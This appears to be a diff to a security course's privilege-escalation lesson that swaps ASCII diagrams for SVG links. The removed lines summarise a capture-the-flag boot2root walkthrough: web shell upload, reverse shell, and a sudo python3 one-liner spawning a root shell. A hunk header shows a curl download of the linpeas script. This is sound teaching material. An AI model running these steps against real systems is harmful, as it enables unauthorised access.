@@ -6,27 +6,7 @@
 
 ## Privilege Escalation Overview
 
-```diagram
-Initial Access (www-data, apache)
-         |
-         v
-   Local Enumeration
-         |
-    +----+----+
-    |         |
-    v         v
-  Linux     Windows
-  PrivEsc   PrivEsc
-    |         |
-    v         v
-  Root      SYSTEM/Admin
-         |
-         v
-   Persistence
-         |
-         v
-   Pivoting
-```
+![privilege_escalation_overview](svg/courses/security/web-application-hacking/20_privilege_escalation/privilege_escalation_overview.svg)
 
 ---
 
@@ -474,30 +454,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 
 ## Boot2Root Full Walkthrough Summary
 
-```diagram
-1. SCAN
-   nmap -sV -sC -p- target -> Found port 80, 22
-
-2. ENUMERATE
-   gobuster -> Found /admin, /uploads, /backup
-   whatweb -> WordPress 5.4, PHP 7.4
-
-3. EXPLOIT
-   wpscan -> Found vulnerable plugin
-   Exploit -> Upload web shell
-   Web shell -> Reverse shell as www-data
-
-4. ESCALATE
-   sudo -l -> Can run /usr/bin/python3 as root
-   sudo python3 -c 'import os; os.system("/bin/bash")'
-   -> ROOT!
-
-5. CAPTURE
-   cat /root/flag.txt -> FLAG{congrats_you_rooted_it}
-
-6. DOCUMENT
-   Write report with all steps and evidence
-```
+![boot2root_full_walkthrough_summary](svg/courses/security/web-application-hacking/20_privilege_escalation/boot2root_full_walkthrough_summary.svg)
 
 ---
 
